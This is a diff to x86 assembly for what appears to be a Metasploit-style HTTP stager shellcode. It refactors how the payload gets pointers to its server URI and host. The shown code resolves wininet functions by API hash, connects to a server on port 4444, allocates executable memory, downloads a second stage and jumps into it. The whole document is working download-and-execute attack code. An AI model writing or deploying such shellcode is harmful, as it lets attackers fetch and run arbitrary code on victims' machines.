@@ -60,7 +60,9 @@ internetconnect:
   push ebx               ; password (NULL)
   push ebx               ; username (NULL)
   push dword 4444        ; PORT
-  jmp short dbl_get_server_host ; push pointer to HOSTNAME
+  call got_server_uri    ; double call to get pointer for both server_uri and
+server_uri:              ;  server_host; server_uri is saved in EDI for later
+  db "/12345", 0x00
 got_server_host:
   push eax               ; HINTERNET hInternet
   push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
@@ -72,10 +74,7 @@ httpopenrequest:
   push ebx               ; accept types
   push ebx               ; referrer
   push ebx               ; version
-  call got_server_uri
-server_uri:
-  db "/12345", 0x00
-got_server_uri:
+  push edi               ; server URI
   push ebx               ; method
   push eax               ; hConnection
   push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
@@ -125,9 +124,6 @@ failure:
   push 0x56A2B5F0        ; hardcoded to exitprocess for size
   call ebp
 
-dbl_get_server_host:
-  jmp get_server_host
-
 allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; MEM_COMMIT
@@ -163,7 +159,8 @@ download_more:
 execute_stage:
   ret                    ; dive into the stored stage address
 
-get_server_host:
+got_server_uri:
+  pop edi
   call got_server_host
 
 server_host:
